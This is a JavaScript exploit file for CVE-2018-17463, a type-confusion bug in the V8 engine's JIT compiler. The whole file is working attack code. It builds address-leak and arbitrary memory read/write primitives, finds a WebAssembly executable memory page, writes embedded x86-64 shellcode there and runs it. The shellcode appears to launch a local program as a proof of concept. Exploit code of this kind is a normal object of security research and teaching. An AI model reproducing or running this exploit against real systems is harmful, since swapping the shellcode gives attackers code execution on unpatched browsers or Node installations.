/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-01-03 18:16:34
 * Author: raycp
 * 
 * Last Modified: 2020-01-06 06:29:52
 * Description: exp for CVE-2018-17463
************************************************************/

const NUM_PROPERTIES = 32;
const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

// Garbage collection is required to move objects to a stable position in
// memory (OldSpace) before leaking their addresses.
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

func = wasm_func();

function checkVuln(){
    function hax(o) {
        // forced a map check
        o.inline;

        // change the map, but v8 think it has no side-effect
        Object.create(o);

        return o.outline;
    }
    
    for (let i=0; i<MAX_ITERATIONS; i++){
        let o = {inline: 0x6666};
        o.outline = 0x7777;
        if(hax(o) !== 0x7777) {
            return;
        }
    }
    throw "[-] Not vulnerable"

}

// Make an object with one inline and numerous out-of-line properties.
function makeObj(propertyValues) {
    let o = {inline: 0x1337};
    for (let i = 0; i < NUM_PROPERTIES; i++) {
        Object.defineProperty(o, 'p' + i, {
            writable: true,
            value: propertyValues[i]
        });
    }
    //print(o);
    return o;
}

let p1, p2;
function findOverlappingProperties() {
    let propertyNames = [];
    for (let i = 0; i < NUM_PROPERTIES; i++) {
        propertyNames[i] = 'p' + i;
    }
    print(propertyNames);
    //%DebugPrint(propertyNames);
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\n')}
            return [${propertyNames.join(', ')}];
        }
    `);

    let propertyValues = [];
    for (let i = 1; i < NUM_PROPERTIES; i++) {
        // There are some unrelated, small-valued SMIs in the dictionary.
        // However they are all positive, so use negative SMIs. Don't use
        // -0 though, that would be represented as a double...
        propertyValues[i] = -i;
    }

    for (let i = 0; i < MAX_ITERATIONS; i++) {
        let r = hax(makeObj(propertyValues));
        //print(typeof r);
        //%DebugPrint(r);
        //readline();
        for (let i = 1; i < r.length; i++) {
            // Properties that overlap with themselves cannot be used.
            if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
                [p1, p2] = [i, -r[i]];
                return;
            }
        }
    }

    throw "Failed to find overlapping properties";
}

// addrOf primitive with type confusion vuln
let leakAddr;
function addrOf(obj)
{
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            return o.p${p1}.x1;
        }
    `);
    let propertyValues = [];
    propertyValues[p1] = {x1 : 13.37, x2 : 14.47};
    propertyValues[p2] = {y1: obj};
    for(let i=0; i<MAX_ITERATIONS; i++) {
        
        leakAddr = hax(makeObj(propertyValues));
        if (leakAddr !== 13.37) {
            return f2i(leakAddr)-1;
        }
    }
    throw "Addrof failed";
}

// overwrite backing store with type confusion vuln
var dataBuf = new ArrayBuffer(0x200);
var dataView = new DataView(dataBuf);
function overwriteDataBuf(addr)
{
    eval(`
        function hax(o, addr) {
            o.inline;
            this.Object.create(o);
            let tmp = o.p${p1}.x2;
            o.p${p1}.x2 = addr;
            return tmp
        }
    `);
    let propertyValues = [];
    propertyValues[p1] = {x1: 13.38, x2: 14.48};
    propertyValues[p2] = dataBuf;
    for(let i=0; i<MAX_ITERATIONS; i++) {
        propertyValues[p1].x2 = 14.48;
        let ret = hax(makeObj(propertyValues), i2f(addr));
        if (ret !== 14.48) {
            //console.log(hex(f2i(ret)));
            return;
        }
    }

    throw("Overwrite DataBuf backing store failed");
    
}

function dataViewRead64(addr)
{
    overwriteDataBuf(addr);
    let ret = dataView.getFloat64(0, true);
    //print(ret);
    return f2i(ret);
}

function dataViewWrite(addr, payload)
{
    overwriteDataBuf(addr);
    
    for(let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
}

function dataVieWrite64(addr, value)
{
    overwriteDataBuf(addr);
    dataView.setFloat64(0, f2i(value), true);
}



function pwn() 
{
    // step 1 check vuln first
    checkVuln();
    console.log("[+] v8 version is vulnerable");

    // step 2 find overlap properties
    findOverlappingProperties();
    print(`[+] Properties p${p1} and p${p2} overlap`);

    // step 3 gc to form a stable memory state
    gc();

    // step 4 arbitrary code execution with wasm object.
    var wasmObjAddr = addrOf(func);
    console.log("wasm object addr: 0x"+hex(wasmObjAddr));
    var sharedInfoAddr = dataViewRead64(wasmObjAddr+0x18) - 1;
    console.log("share info addr: 0x"+hex(sharedInfoAddr));
    var wasmExportedFunctionDataAddr = dataViewRead64(sharedInfoAddr+0x8) - 1;
    console.log("WasmExportedFunctionData addr: 0x"+hex(wasmExportedFunctionDataAddr));
    var instanceAddr = dataViewRead64(wasmExportedFunctionDataAddr+0x10) - 1;
    console.log("instance addr: 0x"+hex(instanceAddr));
    var rwx_addr = dataViewRead64(instanceAddr+0xf0);
    console.log("rwx addr: 0x"+hex(rwx_addr));
    
	var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    	96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    	105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    	72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    	72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    	184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    	94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    
    dataViewWrite(rwx_addr, shellcode);
	
    func();
    //%DebugPrint(dataBuf);
    //%DebugPrint(func);
    //%SystemBreak();
}

pwn();
